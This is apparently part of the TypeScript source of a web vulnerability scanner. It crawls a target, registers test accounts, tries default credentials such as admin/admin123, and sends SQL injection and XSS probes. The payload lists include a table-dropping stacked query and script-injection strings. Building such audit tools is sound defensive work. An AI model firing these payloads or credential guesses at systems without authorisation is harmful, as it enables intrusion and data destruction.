import { prisma } from "./prisma";
import { retrieveContext } from "./rag";
import { generateFixReport } from "./cerebras";
import { emitLog, cleanupScan } from "./scan-logger";
import { sendScanReportEmail } from "./mail";
import { renderWithBrowser, interactiveFormInjection, auditClientStorage, type InteractiveInjectionResult, type StorageFinding } from "./browser";
import { runNmapScan, type NmapFinding } from "./nmap";
import { registerScanController, cleanupScanController } from "./scan-controller";
import { acquireBrowser, releaseBrowser, destroyBrowser } from "./browser-pool";
import * as tls from "tls";
// @ts-ignore
import * as acorn from "acorn";
// @ts-ignore
import { simple as walkSimple } from "acorn-walk";
// ─── Modern Library Imports ───────────────────────────────────────────────────
import * as cheerio from "cheerio";
import semver from "semver";
import { CookieJar } from "tough-cookie";
import pLimit from "p-limit";
import { XMLParser } from "fast-xml-parser";
import SwaggerParser from "@apidevtools/swagger-parser";
import jwt from "jsonwebtoken";

// ─── Modular Probe Sub-Modules ────────────────────────────────────────────────
import { buildPayloadTarget } from "./scanner/payloads";
import { extractHtmlLinksAndForms, isSpaHtmlFallback as isSpaHtmlFallbackModule } from "./scanner/crawler";
import { probeSQLiMultiFormat } from "./scanner/probes/sqli";
import { probeReflectedXSSMultiFormat, analyzeDomXssEvents } from "./scanner/probes/xss";
import { checkGraphQLIntrospection as checkGraphQLIntrospectionModule, probeNoSQLiJson } from "./scanner/probes/api";


interface PendingFinding {
  type: string;
  severity: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW" | "INFO";
  url: string;
  parameter?: string;
  evidence?: string;
  cvssScore: number;
  cveId?: string;
  // ── False-positive reduction fields (optional — defaulted in findings.push) ─
  confidence?: number;         // 0.0 – 1.0: how certain we are this is real
  validationSteps?: string[];  // proof trail: each step that confirmed the finding
  isVerified?: boolean;        // true = multiple independent signals confirmed it
}

const FETCH_HEADERS = {
  "User-Agent": "Mozilla/5.0 (compatible; VulnScanner/3.0; Security-Audit)",
  Accept: "text/html,application/xhtml+xml,*/*;q=0.9",
  "Accept-Language": "en-US,en;q=0.9",
};

// ─────────────────────────────────────────────────────────────────────────────
// CONFIDENCE HELPERS
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Confidence levels used across probes.
 * DETERMINISTIC = header present/absent (near-certain)
 * DUAL_VERIFIED  = two independent payloads confirmed (very high)
 * TIMING_VERIFIED = timing-based with multiple measurements (high)
 * SINGLE_PAYLOAD  = one payload reflected/matched (moderate)
 * PASSIVE_SIGNAL  = parameter name or pattern match only (low)
 */
const CONFIDENCE = {
  DETERMINISTIC: 0.99,
  DUAL_VERIFIED: 0.95,
  TIMING_VERIFIED: 0.90,
  EXEC_VERIFIED: 0.93,
  SINGLE_PAYLOAD: 0.55,
  PASSIVE_SIGNAL: 0.20,
} as const;

/** Build a verified finding (dual-payload or multi-step confirmed). */
function verifiedFinding(
  base: Omit<PendingFinding, "confidence" | "validationSteps" | "isVerified">,
  steps: string[],
  confidence: number = CONFIDENCE.DUAL_VERIFIED
): PendingFinding {
  return { ...base, confidence, validationSteps: steps, isVerified: true };
}

/** Build an unverified (passive/single-event) finding. */
function passiveFinding(
  base: Omit<PendingFinding, "confidence" | "validationSteps" | "isVerified">,
  steps: string[],
  confidence: number = CONFIDENCE.PASSIVE_SIGNAL
): PendingFinding {
  return { ...base, confidence, validationSteps: steps, isVerified: false };
}

// ─────────────────────────────────────────────────────────────────────────────
// UTILITY
// ─────────────────────────────────────────────────────────────────────────────

function safeUrlJoin(base: string, path: string): string | null {
  try { return new URL(path, base).toString(); } catch { return null; }
}

/** Helper to detect Single Page Application (SPA) HTML fallback responses. */
function isSpaHtmlFallback(resp: Response | null, bodyText: string): boolean {
  if (!resp) return false;
  const contentType = (resp.headers.get("content-type") || "").toLowerCase();
  const trimmed = (bodyText || "").trim().toLowerCase();
  if (contentType.includes("text/html") || trimmed.startsWith("<!doctype html") || trimmed.includes("<html") || trimmed.includes("<head>")) {
    return true;
  }
  return false;
}


interface AuthSession {
  cookies: string;
  bearerToken: string;
  csrfToken: string;
  userId: string;
  userId2: string;
  cookies2: string;
  bearerToken2: string;
}

/** Sentinel used as the default when no auth has been acquired. */
const EMPTY_SESSION: AuthSession = {
  cookies: "",
  bearerToken: "",
  csrfToken: "",
  userId: "",
  userId2: "",
  cookies2: "",
  bearerToken2: "",
};


async function attemptAutoRegister(targetUrl: string, log: (m: string) => void): Promise<void> {
  const REGISTER_PATHS = [
    "/api/auth/register", "/api/register", "/api/users",
    "/api/signup", "/api/auth/signup", "/register",
    "/rest/user/register", "/api/v1/auth/register", "/api/v1/users",
  ];
  const SCANNER_ACCOUNTS = [
    { email: "scanner_test_1@vulnscan.internal", password: "VulnScan@Test1!", name: "Scanner Test1", username: "scannertest1" },
    { email: "scanner_test_2@vulnscan.internal", password: "VulnScan@Test2!", name: "Scanner Test2", username: "scannertest2" },
  ];

  log("📝  Attempting auto-registration of scanner test accounts...");

  for (const path of REGISTER_PATHS) {
    const url = safeUrlJoin(targetUrl, path);
    if (!url) continue;

    // Probe endpoint liveness with a throwaway request
    const probe = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json", "User-Agent": FETCH_HEADERS["User-Agent"] },
      body: JSON.stringify({ email: "probe_check@probe.invalid", password: "probe123!" }),
      signal: AbortSignal.timeout(5000),
      // @ts-ignore
      next: { revalidate: 0 },
    }).catch(() => null);

    // Skip 404 (endpoint doesn't exist) and server errors
    if (!probe || probe.status === 404 || probe.status >= 502) {
      log(`ℹ️  Registration endpoint ${path} not available (status: ${probe?.status || 'no response'})`);
      continue;
    }

    log(`🔍  Found potential registration endpoint: ${path} (status: ${probe.status})`);
    let registeredAny = false;
    for (const account of SCANNER_ACCOUNTS) {
      try {
        // Try multiple common registration body shapes
        const bodies = [
          { email: account.email, password: account.password, name: account.name },
          { email: account.email, password: account.password, username: account.username },
          { email: account.email, password: account.password, passwordRepeat: account.password, securityQuestion: { id: 1 }, securityAnswer: "scanner" },
        ];
        for (const body of bodies) {
          const resp = await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json", "User-Agent": FETCH_HEADERS["User-Agent"] },
            body: JSON.stringify(body),
            signal: AbortSignal.timeout(6000),
            // @ts-ignore
            next: { revalidate: 0 },
          }).catch(() => null);
          if (!resp) continue;
          // 200/201 = created, 409/400 = already exists or duplicate — both are fine
          if (resp.status === 200 || resp.status === 201) {
            log(`✅  Registered test account: ${account.email}`);
            registeredAny = true;
            break;
          } else if (resp.status === 409 || resp.status === 422) {
            log(`ℹ️  Test account already exists: ${account.email}`);
            registeredAny = true;
            break;
          } else {
            log(`⚠️  Registration failed for ${account.email}: HTTP ${resp.status}`);
          }
        }
      } catch (err) {
        log(`⚠️  Registration error for ${account.email}: ${err instanceof Error ? err.message : String(err)}`);
      }
    }
    if (registeredAny) {
      log(`✅  Registration successful via ${path}`);
      break; // Found the registration endpoint; done
    }
  }
}

async function attemptAutoLogin(targetUrl: string, log: (m: string) => void, session: AuthSession): Promise<void> {
  const REST_LOGIN_PATHS = [
    "/rest/user/login", "/api/auth/login", "/api/login",
    "/api/v1/auth/login", "/auth/login", "/login", "/admin/login",
    "/accounts/login", "/token", "/api/token", "/api/v1/login",
    "/api/auth/callback/credentials",
  ];
  const TEST_ACCOUNTS = [
    { email: "scanner_test_1@vulnscan.internal", username: "scannertest1", password: "VulnScan@Test1!" },
    { email: "scanner_test_2@vulnscan.internal", username: "scannertest2", password: "VulnScan@Test2!" },
    { email: "admin@juice-sh.op", username: "admin", password: "admin123" },
    { email: "test@test.com", username: "test", password: "test" },
    { email: "user@example.com", username: "user", password: "password" },
  ];

  log("🔑  Attempting authenticated session acquisition...");

  // Register scanner test accounts first so they exist on fresh targets
  await attemptAutoRegister(targetUrl, log);

  for (const path of REST_LOGIN_PATHS) {
    const url = safeUrlJoin(targetUrl, path);
    if (!url) continue;

    let sessionsFilled = 0;
    for (const creds of TEST_ACCOUNTS) {
      if (sessionsFilled >= 2) break;
      try {
        // Build payload variations: JSON body & Form-urlencoded body (for Django/FastAPI/OAuth2)
        const payloadConfigs = [
          {
            headers: { "Content-Type": "application/json", "User-Agent": FETCH_HEADERS["User-Agent"] },
            body: JSON.stringify({ email: creds.email, password: creds.password }),
          },
          {
            headers: { "Content-Type": "application/json", "User-Agent": FETCH_HEADERS["User-Agent"] },
            body: JSON.stringify({ username: creds.username, password: creds.password }),
          },
          {
            headers: { "Content-Type": "application/x-www-form-urlencoded", "User-Agent": FETCH_HEADERS["User-Agent"] },
            body: new URLSearchParams({ username: creds.username, password: creds.password, grant_type: "password" }).toString(),
          },
          {
            headers: { "Content-Type": "application/x-www-form-urlencoded", "User-Agent": FETCH_HEADERS["User-Agent"] },
            body: new URLSearchParams({ email: creds.email, password: creds.password }).toString(),
          },
        ];

        for (const config of payloadConfigs) {
          const resp = await fetch(url, {
            method: "POST",
            headers: config.headers,
            body: config.body,
            signal: AbortSignal.timeout(6000),
            // @ts-ignore
            next: { revalidate: 0 },
          }).catch(() => null);

          if (!resp || (resp.status !== 200 && resp.status !== 201 && resp.status !== 302)) continue;

          const text = await resp.text().catch(() => "");
          let json: any = null;
          try { json = JSON.parse(text); } catch { /* text or redirect response */ }

          const token = json?.token || json?.data?.token || json?.authentication?.token ||
            json?.access_token || json?.accessToken || json?.jwt;
          const userId = String(json?.data?.id || json?.id || json?.user?.id || json?.userId || "");
          const rawCookie = resp.headers.get("set-cookie") || "";

          if (token || rawCookie) {
            if (sessionsFilled === 0) {
              if (token) session.bearerToken = token;
              if (rawCookie) {
                try {
                  const jar = new CookieJar();
                  const cookieStrings = rawCookie.split(/,(?=[^ ])/);
                  for (const cs of cookieStrings) {
                    await jar.setCookie(cs.trim(), url).catch(() => {});
                  }
                  session.cookies = await jar.getCookieString(url);
                } catch {
                  session.cookies = rawCookie.split(";")[0];
                }
              }
              if (userId) session.userId = userId;
              sessionsFilled++;
              log(`✅  Auth session 1 acquired (${creds.email}) via ${path}`);
              break;
            } else if (sessionsFilled === 1) {
              if (token) session.bearerToken2 = token;
              if (rawCookie) {
                try {
                  const jar = new CookieJar();
                  const cookieStrings = rawCookie.split(/,(?=[^ ])/);
                  for (const cs of cookieStrings) {
                    await jar.setCookie(cs.trim(), url).catch(() => {});
                  }
                  session.cookies2 = await jar.getCookieString(url);
                } catch {
                  session.cookies2 = rawCookie.split(";")[0];
                }
              }
              if (userId) session.userId2 = userId;
              sessionsFilled++;
              log(`✅  Auth session 2 acquired (${creds.email}) — for IDOR dual-token probing`);
              break;
            }
          }
        }
      } catch (err) {
        log(`⚠️  Login error for ${creds.email}: ${err instanceof Error ? err.message : String(err)}`);
      }
    }
    if (sessionsFilled > 0) break;
  }
  if (!session.bearerToken && !session.cookies) {
    log("⚠️  Could not acquire an authenticated session — unauthenticated scan only");
  }
}

function authHeaders(session: AuthSession, useSecondSession = false): Record<string, string> {
  const token = useSecondSession ? session.bearerToken2 : session.bearerToken;
  const cookies = useSecondSession ? session.cookies2 : session.cookies;
  const extra: Record<string, string> = {};
  if (token) extra["Authorization"] = `Bearer ${token}`;
  if (cookies) extra["Cookie"] = cookies;
  if (session.csrfToken) extra["X-CSRF-Token"] = session.csrfToken;
  return extra;
}

/** fetch() wrapper that injects auth credentials automatically. */
async function authedFetch(
  url: string,
  options: RequestInit = {},
  timeoutMs = 8000,
  useSecondSession = false,
  session: AuthSession = EMPTY_SESSION
): Promise<Response | null> {
  try {
    const headers: Record<string, string> = {
      ...FETCH_HEADERS,
      ...authHeaders(session, useSecondSession),
      ...(options.headers as Record<string, string> || {}),
    };
    return await fetch(url, {
      ...options,
      headers,
      signal: AbortSignal.timeout(timeoutMs),
      // @ts-ignore
      next: { revalidate: 0 },
    });
  } catch {
    return null;
  }
}

const PROBE_CONCURRENCY = 3;
const PROBE_DELAY_MS = 150;

async function sleep(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/**
 * Battle-tested concurrency control using p-limit.
 * Replaces the manual worker-queue approach which silently swallowed errors.
 * p-limit handles backpressure, proper error propagation, and per-task timeouts.
 */
async function throttledProbes<T>(
  probes: (() => Promise<T | null>)[],
  concurrency = PROBE_CONCURRENCY,
  _delayMs = PROBE_DELAY_MS  // kept for API compatibility; p-limit handles pacing
): Promise<T[]> {
  const limit = pLimit(concurrency);
  const settled = await Promise.allSettled(
    probes.map(probe => limit(async () => {
      try { return await probe(); }
      catch { return null; }
    }))
  );
  const results: T[] = [];
  for (const r of settled) {
    if (r.status === "fulfilled" && r.value !== null && r.value !== undefined) {
      results.push(r.value);
    }
  }
  return results;
}

// ─── Crawler & Extraction Helpers ─────────────────────────────────────────────

/** Describes a parsed HTML form with its action URL, HTTP method, and input field names. */
interface FormTarget {
  actionUrl: string;
  method: "GET" | "POST";
  fields: string[]; // all injectable input field names
}

/**
 * Parse all same-origin HTML forms from a page using cheerio.
 * Cheerio gives accurate DOM traversal even on minified, malformed, or JSX-adjacent HTML
 * where regex-based parsing breaks on attribute ordering or embedded JSON in <script> tags.
 */
function extractForms(html: string, baseUrl: string): FormTarget[] {
  const base = new URL(baseUrl);
  const forms: FormTarget[] = [];
  const INJECTABLE_TYPES = /^(text|search|email|number|tel|url|hidden|password|)$/i;
  const seen = new Set<string>();

  try {
    const $ = cheerio.load(html);
    $('form').each((_, formEl) => {
      try {
        const rawAction = $(formEl).attr('action') || baseUrl;
        const actionUrl = new URL(rawAction, baseUrl);
        if (actionUrl.hostname !== base.hostname) return;

        const methodRaw = ($(formEl).attr('method') || 'POST').toUpperCase();
        const method: 'GET' | 'POST' = methodRaw === 'GET' ? 'GET' : 'POST';

        const fields: string[] = [];
        // Named text-like inputs + textarea + select
        $(formEl).find('input, textarea, select').each((_, el) => {
          const name = $(el).attr('name');
          const type = ($(el).attr('type') || '').toLowerCase();
          if (name && INJECTABLE_TYPES.test(type)) {
            fields.push(name);
          } else if (name && ($(el).is('textarea') || $(el).is('select'))) {
            fields.push(name);
          } else if (!name) {
            // React-style: use id or data-testid as synthetic name
            const synth = $(el).attr('id') || $(el).attr('data-testid');
            if (synth) fields.push(synth);
          }
        });

        const key = `${actionUrl.toString()}|${fields.slice().sort().join(',')}`;
        if (!seen.has(key) && fields.length > 0) {
          seen.add(key);
          forms.push({ actionUrl: actionUrl.toString(), method, fields });
        }
      } catch { /* skip malformed form */ }
    });
  } catch { /* skip entirely unparseable HTML */ }

  return forms.slice(0, 12);
}

/** Extract same-origin links from HTML using cheerio. Excludes static assets. Capped at 50. */
function extractSameOriginLinks(html: string, baseUrl: string): string[] {
  const base = new URL(baseUrl);
  const links = new Set<string>();
  try {
    const $ = cheerio.load(html);
    $('a[href], [action]').each((_, el) => {
      const href = $(el).attr('href') || $(el).attr('action');
      if (!href) return;
      try {
        const u = new URL(href, baseUrl);
        if (
          u.hostname === base.hostname &&
          !/\.(css|js|png|jpg|gif|ico|woff|woff2|svg|pdf|map)$/i.test(u.pathname)
        ) links.add(u.href);
      } catch { /* skip */ }
    });
  } catch { /* skip */ }
  return [...links].slice(0, 50);
}

/** Extract same-origin URLs with query params using cheerio. Capped at 10. */
function extractParamUrls(html: string, baseUrl: string): string[] {
  const base = new URL(baseUrl);
  const out = new Set<string>();
  try {
    const $ = cheerio.load(html);
    $('[href], [action]').each((_, el) => {
      const val = $(el).attr('href') || $(el).attr('action');
      if (!val || !val.includes('?')) return;
      try {
        const u = new URL(val, baseUrl);
        if (u.hostname === base.hostname && [...u.searchParams.keys()].length > 0)
          out.add(u.href);
      } catch { /* skip */ }
    });
  } catch { /* skip */ }
  return [...out].slice(0, 10);
}

/**
 * Extract API path references from inline scripts using cheerio.
 * Only scans <script> text content to avoid false matches in HTML attributes.
 * Capped at 20.
 */
function extractApiEndpoints(html: string, baseUrl: string): string[] {
  const out = new Set<string>();
  const pats = [
    /["'`](\/api\/[^\s"'`?#]{3,80})/g,
    /["'`](\/rest\/[^\s"'`?#]{3,80})/g,
    /["'`](\/v\d+\/[^\s"'`?#]{3,80})/g,
    /["'`](\/graphql[^\s"'`?#]{0,40})/gi,
  ];
  try {
    const $ = cheerio.load(html);
    // Only scan inline script text content — avoids false matches in HTML attributes
    const scriptText = $('script:not([src])').map((_, el) => $(el).text()).get().join('\n');
    for (const pat of pats)
      for (const m of scriptText.matchAll(pat)) {
        try { new URL(m[1], baseUrl); out.add(m[1]); } catch { /* skip */ }
      }
  } catch { /* fallback: skip */ }
  return [...out].slice(0, 20);
}

/**
 * Parse sitemap.xml using fast-xml-parser for robust XML handling.
 * Handles nested <sitemap> indexes, CDATA sections, and namespace prefixes
 * that break the regex-based approach.
 */
function parseSitemap(xml: string, baseUrl: string): string[] {
  const base = new URL(baseUrl);
  const urls: string[] = [];
  try {
    const parser = new XMLParser({ ignoreAttributes: false, cdataPropName: '__cdata' });
    const result = parser.parse(xml);
    // Support both urlset/url/loc and sitemapindex/sitemap/loc
    const urlset = result?.urlset?.url || result?.sitemapindex?.sitemap || [];
    const items = Array.isArray(urlset) ? urlset : [urlset];
    for (const item of items) {
      const loc = item?.loc || item?.__cdata || '';
      if (typeof loc === 'string') {
        try {
          const u = new URL(loc.trim());
          if (u.hostname === base.hostname) urls.push(u.href);
        } catch { /* skip */ }
      }
    }
  } catch {
    // Fallback to regex for malformed XML
    for (const m of xml.matchAll(/<loc>(https?:\/\/[^<]+)<\/loc>/gi)) {
      try {
        const u = new URL(m[1].trim());
        if (u.hostname === base.hostname) urls.push(u.href);
      } catch { /* skip */ }
    }
  }
  return urls.slice(0, 25);
}


/**
 * Download same-origin JS bundle files and extract:
 *   - POST endpoint paths from fetch/axios/XMLHttpRequest calls
 *   - JSON field names used in request bodies (email, password, username, etc.)
 *
 * SPAs render input fields via JavaScript components, not HTML <form> elements.
 * This function finds those fields by reading the app's own JS source code.
 *
 * Returns an array of { path, fields[] } pairs ready for SQLi injection probing.
 */
interface JsApiEndpoint {
  path: string;
  fields: string[];
}

async function extractJsBundleEndpoints(html: string, baseUrl: string): Promise<JsApiEndpoint[]> {
  const base = new URL(baseUrl);
  const results: JsApiEndpoint[] = [];

  // Step 0: Probe common OpenAPI / Swagger paths (FastAPI, Django REST, Spring Boot, NestJS)
  const OPENAPI_PATHS = [
    "/openapi.json", "/swagger.json", "/v1/openapi.json",
    "/api/openapi.json", "/api/v1/openapi.json", "/api/schema/",
  ];

  for (const oPath of OPENAPI_PATHS) {
    try {
      const oUrl = safeUrlJoin(baseUrl, oPath);
      if (!oUrl) continue;
      const resp = await fetch(oUrl, {
        headers: FETCH_HEADERS,
        signal: AbortSignal.timeout(4000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);
      if (resp && resp.ok) {
        const json = await resp.json().catch(() => null);
        if (json && json.paths && typeof json.paths === "object") {
          for (const [pathKey, methods] of Object.entries(json.paths)) {
            if (!pathKey.startsWith("/")) continue;
            const fields: string[] = [];
            if (methods && typeof methods === "object") {
              const postOp = (methods as any)?.post || (methods as any)?.put || (methods as any)?.get;
              const bodyProps = postOp?.requestBody?.content?.["application/json"]?.schema?.properties || {};
              fields.push(...Object.keys(bodyProps));
            }
            if (fields.length === 0) fields.push("q", "query", "id", "search", "email", "username", "password");
            results.push({ path: pathKey, fields });
          }
        }
      }
    } catch { /* skip */ }
  }

  // Step 1: Find all <script src="..."> tags pointing to same-origin JS files
  const scriptUrls: string[] = [];
  for (const m of html.matchAll(/<script[^>]+src=[\"']([^\"']+\.js[^\"']*)[\"']/gi)) {
    try {
      const u = new URL(m[1], baseUrl);
      if (u.hostname === base.hostname) scriptUrls.push(u.href);
    } catch { /* skip */ }
  }

  // Also probe common SPA bundle paths that may not appear in the HTML (expanded)
  const COMMON_BUNDLE_PATHS = [
    "/main.js", "/main-es2015.js", "/main-es5.js", "/polyfills-es2015.js", "/runtime-es2015.js", "/polyfills.js", "/runtime.js",
    "/bundle.js", "/app.js", "/vendor.js",
    "/static/js/main.chunk.js", "/static/js/bundle.js",
    "/runtime-main.js", "/scripts/app.js", "/assets/js/main.js",
    "/static/js/app.js", "/dist/js/app.js", "/build/static/js/main.js",
    "/_next/static/chunks/main.js", "/_next/static/chunks/pages.js",
    "/assets/index.js", "/js/app.js", "/public/js/app.js",
  ];
  for (const path of COMMON_BUNDLE_PATHS) {
    try { scriptUrls.push(new URL(path, baseUrl).href); } catch { /* skip */ }
  }

  // Step 2: Download each JS file (cap at 5, skip files > 2MB)
  const uniqueScripts = [...new Set(scriptUrls)].slice(0, 5);
  for (const jsUrl of uniqueScripts) {
    let jsCode = "";
    try {
      const resp = await fetch(jsUrl, {
        headers: FETCH_HEADERS,
        signal: AbortSignal.timeout(8000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);
      if (!resp || !resp.ok) continue;
      const rawText = await resp.text();
      if (rawText.length > 2_000_000) continue;
      jsCode = rawText;
    } catch { continue; }

    if (!jsCode) continue;

    // Step 3: Extract POST endpoint paths from fetch/axios/http.post calls (expanded patterns)
    const endpointPatterns = [
      /fetch\(\s*[`"']([^`"']+)[`"']\s*,\s*\{[^}]*method\s*:\s*[`"']POST[`"']/gi,
      /(?:axios|http)\.post\(\s*[`"']([^`"']+)[`"']/gi,
      /\.post\(\s*[`"'](\/[^`"']{3,80})[`"']/gi,
      /\.open\(\s*[`"']POST[`"']\s*,\s*[`"']([^`"']+)[`"']/gi,
      /["'`](\/api\/[^`"']{3,80})["']/gi, // General API paths
      /["'`](\/rest\/[^`"']{3,80})["']/gi, // General REST paths
      /["'`](\/v\d+\/[^`"']{3,80})["']/gi, // Versioned API paths
      /["'`](\/[^`"']{5,80})["']/gi, // Any reasonable path
    ];

    const foundPaths = new Set<string>();
    for (const pat of endpointPatterns) {
      for (const m of jsCode.matchAll(pat)) {
        const rawPath = m[1];
        if (rawPath.includes("${")) continue; // skip template literals
        try {
          const u = new URL(rawPath, baseUrl);
          if (u.hostname === base.hostname) foundPaths.add(u.pathname);
        } catch {
          if (rawPath.startsWith("/")) foundPaths.add(rawPath);
        }
      }
    }

    // Step 4: For each POST path, extract field names from nearby JSON body patterns
    for (const path of foundPaths) {
      const fields = new Set<string>();
      const pathIdx = jsCode.indexOf(path);
      if (pathIdx === -1) continue;

      // Look at 1500 chars around the endpoint reference to find the request body shape
      const snippet = jsCode.slice(Math.max(0, pathIdx - 500), pathIdx + 1000);

      // Match field names from JSON.stringify({email, password}) or body: {username, pass}
      for (const fm of snippet.matchAll(/(?:JSON\.stringify\(|body\s*:\s*)\s*\{([^}]{0,400})\}/g)) {
        for (const keyMatch of (fm[1] ?? "").matchAll(/(?:^|,|\{)\s*([\w]+)\s*:/g)) {
          const fieldName = keyMatch[1];
          if (/^(email|username|user|login|password|pass|pwd|name|phone|search|query|q|id|token)$/i.test(fieldName)) {
            fields.add(fieldName);
          }
        }
      }

      // Fallback: infer fields from path semantics
      if (fields.size === 0) {
        if (/login|auth|signin|session|user/i.test(path)) {
          fields.add("email"); fields.add("password"); fields.add("username");
        } else if (/search|query|find|product/i.test(path)) {
          fields.add("q"); fields.add("query"); fields.add("search");
        }
      }

      if (fields.size > 0) {
        results.push({ path, fields: [...fields] });
      }
    }
  }

  return results;
}

const SQL_ERROR_PATTERNS_ACTIVE = [
  /SQL syntax.*MySQL/i, /Warning.*mysql_/i, /MySQLSyntaxErrorException/i,
  /PostgreSQL.*ERROR/i, /PSQLException/i, /ORA-\d{4,}/i,
  /Microsoft OLE DB.*SQL Server/i, /Unclosed quotation mark/i,
  /SQLiteException/i, /You have an error in your SQL syntax/i,
  /ODBC SQL Server Driver/i, /Syntax error.*in query expression/i,
  /pg_query|pg_exec|sqlite_query|mssql_query/i,
  /supplied argument is not a valid MySQL/i,
  /Column count doesn't match value count/i,
  /quoted string not properly terminated/i,
  // SQLite + Sequelize (used by OWASP Juice Shop)
  /SQLITE_ERROR/i, /sqlite3\.DatabaseError/i,
  /SequelizeDatabaseError/i, /near \".*\": syntax error/i,
  /SQLITE_CONSTRAINT/i, /unrecognized token/i,
];

// Multiple SQLi payloads: error-based, boolean-based, UNION-based, and nested parenthesis break-outs
const SQLI_PAYLOADS = [
  "'",                           // basic single quote — triggers syntax errors
  "'--",                         // comment out rest of query
  "' OR '1'='1",                 // boolean always-true
  "' OR '1'='1'--",              // boolean with comment
  "1' AND 1=1--",                // numeric context boolean
  "')) OR 1=1--",                // nested double parenthesis (SQLite / Juice Shop search query break-out)
  "'))--",                       // nested double parenthesis comment
  "') OR ('1'='1",               // single parenthesis OR
  "' UNION SELECT NULL--",       // UNION-based (1 column)
  "' UNION SELECT NULL,NULL--",  // UNION-based (2 columns)
  "; DROP TABLE users--",        // stacked query (rare but detectable)
  "' OR 1=1--",                  // numeric boolean variant
  "admin'--",                    // admin bypass
];

// XSS payloads: various encoding/context evasion techniques
const XSS_PAYLOADS = [
  "<vulnscanXSStag>",                                          // minimal tag — safest marker
  "<script>/*vulnscan*/</script>",                             // script tag
  `"><img src=x onerror=alert('vulnscan')>`,                   // attribute break-out
  `';alert('vulnscan');//`,                                    // JS context break-out
  `<svg onload=alert(1)>`,                                     // SVG context
  `<img src="" onerror="document.title='VULNSCAN'">`,         // onerror handler
  `javascript:alert('vulnscan')`,                              // protocol-based
  `%3Cscript%3Ealert(1)%3C/script%3E`,                       // URL-encoded variant
];

// ─────────────────────────────────────────────────────────────────────────────
// FIX #3: MULTI-PAYLOAD CONFIRMATION HELPERS
// All probes verify with a 2nd distinct payload before reporting.
// ─────────────────────────────────────────────────────────────────────────────

async function confirmSQLiHit(
  url: string,
  param: string,
  triggeringPayload: string,
  isForm = false,
  formFields?: string[],
  method?: "GET" | "POST",
  session: AuthSession = EMPTY_SESSION
): Promise<boolean> {
  const confirmPayloads = SQLI_PAYLOADS.filter(p => p !== triggeringPayload).slice(0, 3);
  for (const confirmPayload of confirmPayloads) {
    try {
      let body = "";
      let fetchUrl = url;
      if (isForm && formFields) {
        const fd = new URLSearchParams();
        for (const f of formFields) fd.set(f, f === param ? confirmPayload : "confirm_test");
        if (method === "POST") {
          const resp = await authedFetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: fd.toString(),
          }, 8000, false, session);
          if (!resp) continue;
          body = await resp.text();
        } else {
          const u = new URL(url);
          for (const [k, v] of fd) u.searchParams.set(k, v);
          fetchUrl = u.toString();
        }
      } else {
        const u = new URL(url);
        u.searchParams.set(param, confirmPayload);
        fetchUrl = u.toString();
      }
      if (!body) {
        const resp = await authedFetch(fetchUrl, {}, 8000, false, session);
        if (!resp) continue;
        body = await resp.text();
      }
      if (SQL_ERROR_PATTERNS_ACTIVE.some(p => p.test(body))) return true;
    } catch { /* try next */ }
  }
  return false;
}

async function confirmXSSHit(
  url: string,
  param: string,
  triggeringPayload: string,
  session: AuthSession = EMPTY_SESSION
): Promise<boolean> {
  const confirmPayloads = XSS_PAYLOADS.filter(p => p !== triggeringPayload).slice(0, 2);
  for (const payload of confirmPayloads) {
    try {
      const u = new URL(url);
      u.searchParams.set(param, payload);
      const resp = await authedFetch(u.toString(), {}, 8000, false, session);
      if (!resp) continue;
      const body = await resp.text();
      const reflected = body.includes(payload) &&
        !body.includes(payload.replace(/</g, "&lt;").replace(/>/g, "&gt;"));
      if (reflected) return true;
    } catch { /* try next */ }
  }
  return false;
}

/**
 * Inject SQLi payloads into a URL query parameter and detect SQL error signatures.
 * FIX #2: Uses authedFetch. FIX #3: Confirms with a second payload before reporting.
 */
async function probeSQLiError(paramUrl: string, session: AuthSession = EMPTY_SESSION): Promise<PendingFinding | null> {
  try {
    const u = new URL(paramUrl);
    const params = [...u.searchParams.keys()];
    if (params.length === 0) return null;

    for (const param of params) {
      const origVal = u.searchParams.get(param) ?? "";
      for (const payload of SQLI_PAYLOADS) {
        try {
          const testUrl = new URL(u.toString());
          testUrl.searchParams.set(param, origVal + payload);
          const resp = await authedFetch(testUrl.toString(), {}, 8000, false, session);
          if (!resp) continue;
          const body = await resp.text();
          const hit = SQL_ERROR_PATTERNS_ACTIVE.find((p) => p.test(body));
          if (!hit) continue;
          // FIX #3: confirm with a second payload
          const confirmed = await confirmSQLiHit(paramUrl, param, payload, false, undefined, undefined, session);
          if (!confirmed) continue;
          return {
            type: "sql-injection-reflected",
            severity: "CRITICAL",
            url: testUrl.toString(),
            parameter: param,
            evidence: `SQL Injection confirmed (dual-payload verified) via URL parameter "${param}". Payload "${payload}" triggered a database error, confirmed with a second structurally different payload. The application builds SQL queries from raw user input without parameterization.`,
            cvssScore: 9.8,
            cveId: "CWE-89",
          };
        } catch { /* next payload */ }
      }
    }
  } catch { /* skip */ }
  return null;
}

/**
 * Submit SQLi payloads to every input field in an HTML form via POST/GET.
 * FIX #2: Uses authedFetch. FIX #3: Dual-payload confirmation.
 */
async function probeFormSQLi(form: FormTarget, session: AuthSession = EMPTY_SESSION): Promise<PendingFinding | null> {
  const nonPasswordFields = form.fields.filter((f) => !/^pass(word)?|pwd|secret$/i.test(f));
  if (nonPasswordFields.length === 0) return null;

  for (const field of nonPasswordFields) {
    for (const payload of SQLI_PAYLOADS) {
      try {
        const formData = new URLSearchParams();
        for (const f of form.fields) formData.set(f, f === field ? payload : "test");

        let resp: Response | null = null;
        if (form.method === "POST") {
          resp = await authedFetch(form.actionUrl, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: formData.toString(),
            redirect: "follow",
          }, 8000, false, session);
        } else {
          const getUrl = new URL(form.actionUrl);
          for (const [k, v] of formData) getUrl.searchParams.set(k, v);
          resp = await authedFetch(getUrl.toString(), {}, 8000, false, session);
        }

        if (!resp) continue;
        const body = await resp.text();
        if (!SQL_ERROR_PATTERNS_ACTIVE.some((p) => p.test(body))) continue;

        // FIX #3: confirm
        const confirmed = await confirmSQLiHit(form.actionUrl, field, payload, true, form.fields, form.method, session);
